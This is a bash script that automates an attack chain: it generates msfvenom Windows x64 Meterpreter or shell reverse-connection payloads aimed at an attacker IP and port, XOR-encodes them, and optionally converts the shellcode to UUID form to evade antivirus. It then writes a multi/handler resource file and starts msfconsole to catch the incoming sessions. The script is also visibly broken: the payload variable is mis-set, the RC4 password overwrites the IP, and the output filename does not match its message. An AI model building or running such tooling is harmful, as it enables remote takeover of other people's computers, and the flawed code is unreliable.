#!/bin/bash
PAYLOAD_HTTPS="windows/x64/meterpreter/reverse_https"
PAYLOAD_RC4="windows/x64/meterpreter/reverse_tcp_rc4"
PAYLOAD_SHELL="windows/x64/shell/reverse_tcp"
PAYLOAD_SIMPLE_M="windows/x64/meterpreter/reverse_tcp"

#Check if root
if [[ $EUID -ne 0 ]]; then
   echo -e "\033[31mThis script must be run as root!\033[0m" 
   exit 1
fi

#Clean workspace beafore start working
echo -e "\033[32mCleaning your workspace...\033[0m"
SC=shellcode.bin
if test -f "$SC"; then
    rm $SC
fi
sleep 1
MP=meterpreter.rc
if test -f "$MP"; then
    rm $MP
fi


#build automation for shellcode
echo "Let's Build your shellcode"

echo "what is your ip address(kali ip)?"
read -p "ip:" IP
echo nice ip: $IP
read -p "Now, what is your port that you want to listen to:" PORT
echo "Nice one, My favorite!"

PS3='Please enter your choice: '
payloads=($PAYLOAD_HTTPS $PAYLOAD_RC4 $PAYLOAD_SHELL $PAYLOAD_SIMPLE_M)
select opt in "${payloads[@]}"
do
    case $opt in
        $PAYLOAD_HTTPS)
            echo "you chose: $PAYLOAD_HTTPS"
            ;;
        $PAYLOAD_RC4)
            echo "you chose: $PAYLOAD_RC4"
            read -p "please enter rc4 password:" IP
            ;;
        $PAYLOAD_SHELL)
            echo "you chose: $PAYLOAD_SHELL"
            ;;
        $PAYLOAD_SIMPLE_M)
            echo "you chose: $PAYLOAD_SIMPLE_M"
            PAYLOAD = $REPLY
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

echo -e "\033[32mStart building your shellcode...\033[0m"

#sudo msfvenom RC4PASSWORD=apolo11 -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=$IP LPORT=$PORT -e x64/xor/dynamic -f python -b "x00" > shellcode.bin #> /dev/null 2>&1
sudo msfvenom -a x64 --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT -e x64/xor/dynamic -f python -b "x00" > shellcode.py


echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
sleep 2



#Check if user wants to convert shellcode to uuid
read -r -p "Do you want to covert your shellcode to uuid structure? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
    echo -e "\033[32mConverting is running...\033[0m"
    sleep 1
    sudo python3 Shellcode2UUID.py
else
    echo -e "\033[32mOk, it's fine too\033[0m"
    exit 1
fi



#Create automation for meterpreter shell
echo -e "\033[32mNow, Let's build your meterpreter shell automation\033[0m"
sleep 1
sudo touch meterpreter.rc
echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD $PAYLOAD >> meterpreter.rc
echo set LHOST $IP >> meterpreter.rc
echo set LPORT $PORT >> meterpreter.rc
echo set ExitOnSession false >> meterpreter.rc
echo exploit -j -z >> meterpreter.rc
echo "Output:"
cat meterpreter.rc

#Check if user wants to start metasploit
read -r -p "Do you want to start metasploit? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
    sudo msfconsole -r  meterpreter.rc
else
    echo -e "\033[31mBye, Have a great time\033[0m"
    exit 1
fi


